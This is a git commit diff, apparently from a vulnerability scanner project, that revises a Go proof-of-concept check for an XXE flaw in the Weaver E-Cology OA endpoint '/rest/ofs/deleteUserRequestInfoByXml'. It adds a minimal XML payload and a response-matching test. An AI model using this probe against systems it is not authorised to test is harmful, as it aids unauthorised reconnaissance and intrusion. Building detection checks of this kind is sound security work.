76a9ce3f1e351e666fddad22014af7e68c510208
york-cmd <958913001@qq.com>
2023-07-13 17:02:26 +0800

    poc-ecology-oa-byxml-xxe-fix

--- pocs_go/weaver/E-Cology-byxml-xxe.go
+++ pocs_go/weaver/E-Cology-byxml-xxe.go
@@ -8,10 +8,12 @@ import (
 )
 
 func E_Cology_byxml_xxe(u string) bool {
-
-	if req, err := pkg.HttpRequset(u+"/rest/ofs/deleteUserRequestInfoByXml", "GET", "", false, nil); err == nil {
-
-		if req.StatusCode == 200 && strings.Contains(req.Body, "WfData") && strings.Contains(req.Body, "ResultInfo") {
+	header := make(map[string]string)
+	header["Content-Type"] = "application/xml"
+	payload := "<?xml version=\"1.0\"?>\r\n<!DOCTYPE>"
+	if req, err := pkg.HttpRequset(u+"/rest/ofs/deleteUserRequestInfoByXml", "GET", payload, false, header); err == nil {
+		//pkg.GoPocLog(req.Body)
+		if req.StatusCode == 200 && strings.Contains(req.Body, "WfData") {
 			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_byxml_xxe|%s\n", u+"/rest/ofs/deleteUserRequestInfoByXml"))
 			return true
 		}
